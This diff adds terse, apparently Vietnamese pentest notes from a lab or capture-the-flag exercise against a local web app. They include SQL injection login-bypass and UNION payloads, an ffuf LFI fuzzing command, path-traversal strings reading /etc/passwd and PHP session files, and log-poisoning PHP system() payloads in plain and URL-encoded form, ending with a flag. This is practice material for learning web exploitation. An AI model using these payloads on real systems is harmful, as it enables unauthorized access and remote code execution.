@@ -1,0 +1,57 @@
+http://www.trilocor.local:8088/
+=>Hr
+
+=> sqli
+
+=>NGOAI POST THI CO THE GET
+http://www.trilocor.local:8088/index.php?username=&password=
+
+http://www.trilocor.local:8088/index.php?username=or+'1'=1--+-&password=1
+=> database error
+http://www.trilocor.local:8088/index.php?username=' UNION SELECT 1,database(),3,4-- -&password=1
+
+or http://www.trilocor.local:8088/index.php?username=' OR '1' = '1'-- -&password=1
+=> complete
+
+
+=> phat hien chuc nang thay doi language 
+
+
+
+=> test payload LFI
+
+ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+     -X POST \
+     -u http://www.trilocor.local:8088/dashboard.php \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -H "Cookie: PHPSESSID=hobnvudna1vtschi5ivfgsn4f6" \
+     -d "language=FUZZ" -fs 3035
+
+
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+
+
+
+....//....//....//....//....//....//....//....//....//....//....//....//var/lib/php/sessions/sess_(YOUR SESSSION)
+
+hobnvudna1vtschi5ivfgsn4f6
+
+=> thu doc log qua phpsessionid
+
+
+....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/lib/php/sessions/sess_hobnvudna1vtschi5ivfgsn4f6
+
+
+=> phat hien co the doc duoc log
+
+
+=> thu payload <?php system('ls /*.txt'); ?> 
+=> encode %3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2f%2a%2e%74%78%74%27%29%3b%20%3f%3e
+
+=> doc lai xem
+
+=> co doc duoc (LOG POISONING)
+
+=> thu payload <?php system('cat /*.txt'); ?> 
+=> encode %3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%2a%2e%74%78%74%27%29%3b%20%3f%3e
+=> FLAG: 7209e09b9231855a9ec483c61990960e
